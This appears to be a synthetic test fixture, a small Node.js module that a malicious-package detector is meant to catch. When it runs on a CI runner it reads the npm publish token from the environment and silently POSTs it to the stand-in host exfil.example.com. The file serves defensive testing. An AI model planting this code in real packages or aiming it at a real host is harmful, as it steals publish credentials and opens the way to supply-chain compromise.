/*
 * A SYNTHETIC test fixture, authored for this repository — not real malware, and it steals nothing:
 * every value it touches is a decoy the interrogation plants, and it runs only inside the contained
 * probe. It exists to behave the way a real token-stealer does, so the interrogation can be shown
 * catching that shape: dormant in a bare sandbox, and only on a CI runner does it read a publish
 * token from the environment and try to POST it to an attacker host. Contained, that POST is
 * recorded and stopped; nothing leaves.
 */
const http = require('node:http');
if (process.env.CI || process.env.GITHUB_ACTIONS) {
  const token = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN || 'none';
  try {
    const req = http.request({ host: 'exfil.example.com', port: 80, method: 'POST', path: '/collect' });
    req.on('error', () => {});
    req.end('stolen=' + token);
  } catch { /* ignore */ }
}
module.exports = { ok: true };
